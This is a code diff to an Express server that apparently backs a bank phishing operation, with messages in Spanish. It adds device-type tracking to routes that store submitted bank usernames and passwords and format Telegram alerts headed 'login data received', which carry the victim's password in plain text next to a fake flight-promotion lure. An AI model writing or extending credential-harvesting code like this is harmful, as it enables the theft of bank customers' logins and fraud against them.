@@ -1205,6 +1205,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               saved: false,
               createdAt: new Date(),
               deviceId: deviceId,
+              dispositivo: clientData.dispositivo || 'Desconocido', // Guardar tipo de dispositivo
               // Datos del cliente si es login
               username: clientData.username || null,
               password: clientData.password || null
@@ -1231,12 +1232,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
               telegramMessage = `🎫 <b>PROMOCIÓN DE VUELOS INICIADA</b>\n\n` +
                 `📋 <b>Folio:</b> ${uniqueFolio}\n` +
                 `🏦 <b>Banco:</b> ${banco}\n` +
+                `📱 <b>Dispositivo:</b> ${clientData.dispositivo || 'Desconocido'}\n` +
                 `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                 `✅ <b>Estado:</b> Cliente aceptó términos y condiciones`;
             } else if (clientData.username && clientData.password) {
               telegramMessage = `🔐 <b>DATOS DE LOGIN RECIBIDOS</b>\n\n` +
                 `📋 <b>Folio:</b> ${uniqueFolio}\n` +
                 `🏦 <b>Banco:</b> ${banco}\n` +
+                `📱 <b>Dispositivo:</b> ${clientData.dispositivo || 'Desconocido'}\n` +
                 `📧 <b>Usuario:</b> ${clientData.username}\n` +
                 `🔑 <b>Contraseña:</b> ${clientData.password}\n` +
                 `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
